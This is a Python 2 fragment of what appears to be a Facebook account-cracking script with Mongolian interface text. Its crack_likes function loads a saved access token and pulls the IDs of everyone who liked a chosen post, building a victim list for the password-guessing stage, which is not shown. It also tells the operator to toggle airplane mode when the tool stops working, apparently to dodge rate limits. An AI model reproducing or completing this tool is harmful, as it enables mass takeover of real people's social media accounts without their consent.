##### CRACK LIKES #####
def crack_likes():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Cookie Алдаатай"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.system('clear')
		print logo
		print 50* "\033[1;94m─"
		print ("        \033[1;96m●●● \033[1;97mCrack from post\033[1;96m ●●●")
		print 50* "\033[1;94m─"
		tez = raw_input("\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m ID post Group/Friend \033[1;91m :\033[1;92m ")
		r = requests.get("https://graph.facebook.com/"+tez+"/likes?limit=9999999&access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
		jalan('\r\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mБуруу ID \033[1;97m...')
	except KeyError:
		print"\033[1;97m{\033[1;91m!\033[1;97m} ID post  !"
		raw_input("\n\033[1;96m[<\033[1;97mБуцах>\033[1;96m]")
		menu()
		
	print "\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mНийт ID \033[1;91m:\033[1;92m "+str(len(id))
	print('\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mЗогсоох бол CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mАжиллаж байна"+o),;sys.stdout.flush();time.sleep(1)
	print("\n\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mАжиллахгүй байвал Airplane mode асааж унтраана уу")
	print ("\033[1;94m──────────────────────────────────────────────────")
	
##### MAIN LIKES #####
